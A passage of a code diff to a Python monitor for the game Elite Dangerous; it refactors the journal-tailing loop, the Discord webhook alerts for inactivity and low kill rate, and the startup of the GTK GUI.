-                    value=f"{fmt_credits(state.stack_value)} — {_status}",
-                    inline=False,
-                )
-
-            embed.set_footer(text=f"{PROGRAM} v{VERSION}")
-            embed.set_timestamp()
-            try:
-                discord_hook.add_embed(embed)
-                discord_hook.execute()
-                discord_hook.remove_embeds()
-                restore_webhook_identity()
-                if (
-                    discord_cfg["ForumChannel"]
-                    and discord_hook.thread_name
-                    and not discord_hook.thread_id
-                ):
-                    discord_hook.thread_name = None
-                    discord_hook.thread_id = discord_hook.id
-            except Exception as e:
-                print(
-                    f"{Terminal.WHITE}Discord:{Terminal.END} Startup embed error: {e}"
-                )
-
-        while True:
-            line = file.readline()
-
-            if not line:
-                time.sleep(1)
-                refresh_config()
-
-                # Check whether ED has started a new journal
-                latest = find_latest_journal()
-                if latest and latest != jfile:
-                    print(
-                        f"{Terminal.YELL}New journal detected:{Terminal.END} {latest.name}"
-                    )
-                    return latest
-
-                now_mono = time.monotonic()
-
-                # ── Not-in-game detection ──────────────────────────────────────
-                # Check for: game client not running, or player at main menu.
-                # Grace periods:
-                #   - 5 min from EDMD startup (state.offline_since_mono is None and
-                #     not state.in_game: we haven't seen a LoadGame yet)
-                #   - 15 min from the point we detected the player left the game
-                #     (state.offline_since_mono is set by MainMenu / Shutdown)
-                # After grace: notify at max configured level, re-alert hourly.
-                # While not in game (and grace expired): suppress all other output.
-                OFFLINE_STARTUP_GRACE   = 5  * 60   # seconds before first check
-                OFFLINE_MENU_GRACE      = 15 * 60   # seconds of grace after menu/quit
-                OFFLINE_RENOTIFY        = 60 * 60   # re-alert interval (1 hour)
-                _startup_elapsed = now_mono - _edmd_start_mono
-
-                # Determine whether we are currently considered offline
-                _not_in_game = not state.in_game and not state.in_preload
-
-                if _not_in_game:
-                    # First time we notice: start the offline clock if not already set
-                    # (handles the case where ED was never detected at EDMD startup)
-                    if state.offline_since_mono is None:
-                        state.offline_since_mono = now_mono
-
-                    offline_elapsed = now_mono - state.offline_since_mono
-
-                    # Choose which grace applies:
-                    #   - If we haven't seen LoadGame at all yet, use startup grace
-                    #   - Otherwise use the menu/quit grace
-                    if _startup_elapsed < OFFLINE_STARTUP_GRACE:
-                        _grace_ok = False   # still inside startup window
-                    elif offline_elapsed < OFFLINE_MENU_GRACE:
-                        _grace_ok = False   # still inside menu/quit window
-                    else:
-                        _grace_ok = True
-
-                    if _grace_ok:
-                        # Check whether ED client is actually running (process check)
-                        _ed_up = _ed_client_running()
-                        _reason = (
-                            "Elite Dangerous client not detected"
-                            if not _ed_up
-                            else "Player at main menu — not in session"
-                        )
-
-                        cooldown_ok = (
-                            state.last_offline_alert is None
-                            or now_mono - state.last_offline_alert >= OFFLINE_RENOTIFY
-                        )
-                        if cooldown_ok:
-                            _level = _max_notify_level()
-                            emit(
-                                msg_term=f"Not in game: {_reason}",
-                                msg_discord=f"⛔ **Not in game** — {_reason}",
-                                emoji="⛔",  sigil="!  WARN",
-                                timestamp=state.event_time,
-                                loglevel=_level,
-                            )
-                            state.last_offline_alert = now_mono
-
-                        # Suppress all further output this tick while not in game
-                        continue
-                else:
-                    # Back in game — reset offline tracking
-                    # (also reset here in case LoadGame event arrived before this tick)
-                    state.offline_since_mono = None
-
-
-                SUMMARY_INTERVAL = 15 * 60  # seconds
-                if (
-                    state.session_start_time
-                    and active_session.kills > 0
-                    and state.last_periodic_summary is not None
-                    and now_mono - state.last_periodic_summary >= SUMMARY_INTERVAL
-                ):
-                    state.last_periodic_summary = now_mono
-                    emit_summary(active_session, logtime=state.event_time)
-
-                # ── Inactivity alert (no kills for WarnNoKills minutes) ────────
-                warn_no_kills = app_settings.get("WarnNoKills", 20)
-                warn_initial  = app_settings.get("WarnNoKillsInitial", 5)
-                warn_cooldown = app_settings.get("WarnCooldown", 15)
-                if (
-                    notify_levels.get("InactiveAlert", 3) > 0
-                    and state.session_start_time
-                    and warn_no_kills > 0
-                ):
-                    # Use shorter grace period if no kill has been made yet
-                    threshold_mins = (
-                        warn_initial if active_session.kills == 0 else warn_no_kills
-                    )
-                    threshold_secs = threshold_mins * 60
-                    last_kill = active_session.last_kill_mono or (
-                        state.last_periodic_summary or now_mono
-                    )
-                    cooldown_ok = (
-                        state.last_inactive_alert is None
-                        or now_mono - state.last_inactive_alert >= warn_cooldown * 60
-                    )
-                    if cooldown_ok and now_mono - last_kill >= threshold_secs:
-                        idle_dur = fmt_duration(now_mono - last_kill)
-                        emit(
-                            msg_term=f"No kills in {idle_dur} — session may be inactive",
-                            msg_discord=f"⚠️ **No kills in {idle_dur}** — session may be inactive",
-                            emoji="⚠️",  sigil="!  WARN",
-                            timestamp=state.event_time,
-                            loglevel=notify_levels.get("InactiveAlert", 3),
-                        )
-                        state.last_inactive_alert = now_mono
-
-                # ── Low kill rate alert ────────────────────────────────────────
-                warn_rate = app_settings.get("WarnKillRate", 20)
-                if (
-                    notify_levels.get("RateAlert", 3) > 0
-                    and warn_rate > 0
-                    and active_session.kills >= 3
-                    and len(active_session.recent_kill_times) >= 3
-                ):
-                    recent_avg_secs = (
-                        sum(active_session.recent_kill_times)
-                        / len(active_session.recent_kill_times)
-                    )
-                    recent_rate = 3600 / recent_avg_secs if recent_avg_secs > 0 else 0
-                    cooldown_ok = (
-                        state.last_rate_alert is None
-                        or now_mono - state.last_rate_alert >= warn_cooldown * 60
-                    )
-                    if cooldown_ok and recent_rate < warn_rate:
-                        rate_fmt = f"{recent_rate:.1f}"
-                        emit(
-                            msg_term=(
-                                f"Kill rate low: {rate_fmt}/hr "
-                                f"(threshold: {warn_rate}/hr)"
-                            ),
-                            msg_discord=(
-                                f"📉 **Kill rate low: {rate_fmt}/hr** "
-                                f"(threshold: {warn_rate}/hr)"
-                            ),
-                            emoji="📉",  sigil="!  WARN",
-                            timestamp=state.event_time,
-                            loglevel=notify_levels.get("RateAlert", 3),
-                        )
-                        state.last_rate_alert = now_mono
-
-                continue
-
-            handle_event(line)
-
-
-
-def run_monitor():
-    try:
-        current_journal = journal_file
-
-        while True:
-            next_journal = monitor_journal(current_journal)
-            if next_journal:
-                current_journal = next_journal
-            else:
-                break
-
-    except KeyboardInterrupt:
-        if not gui_mode:
-            print("\nExiting...")
-        state.sessionend()
-        # Persist session counters so an immediate --upgrade restart can restore them
-        if state.session_start_time and journal_file:
-            save_session_state(journal_file)
-
-    except FileNotFoundError:
-        abort("Journal file not found")
-
-    except Exception as e:
-        abort(f"Fatal error: {e}")
 
 
 if __name__ == "__main__":
     if gui_mode:
         try:
-            from edmd_gui import EdmdApp
+            from gui.app import EdmdApp
         except ImportError as e:
-            abort(
-                f"GUI mode requested but edmd_gui.py could not be loaded: {e}\nEnsure PyGObject (GTK4) is installed: pacman -S python-gobject gtk4"
+            print(
+                f"{Terminal.WARN}ERROR:{Terminal.END} GUI mode requested but gui/ could not be loaded: {e}\n"
+                f"Ensure PyGObject (GTK4) is installed: pacman -S python-gobject gtk4"
             )
+            sys.exit(1)
 
         monitor_thread = threading.Thread(target=run_monitor, daemon=True)
         monitor_thread.start()
 
-        status_thread = threading.Thread(target=_poll_status_json, daemon=True)
+        status_thread = threading.Thread(
+            target=_poll_status_json,
+            args=(journal_dir, state, gui_queue),
+            daemon=True,
+        )
         status_thread.start()
 
-        app = EdmdApp(
-            state=state,
-            active_session=active_session,
-            gui_queue=gui_queue,
-            gui_cfg=gui_cfg,
-            program=PROGRAM,
-            version=VERSION,
-            fmt_credits=fmt_credits,
-            fmt_duration=fmt_duration,
-            rate_per_hour=rate_per_hour,
-        )
+        app = EdmdApp(core, PROGRAM, VERSION)
         app.run(None)
 
     else:
-        try:
-            run_monitor()
-        except KeyboardInterrupt:
-            print("\nExiting...")
-            state.sessionend()
-            if state.session_start_time and journal_file:
-                save_session_state(journal_file)
+        run_monitor()
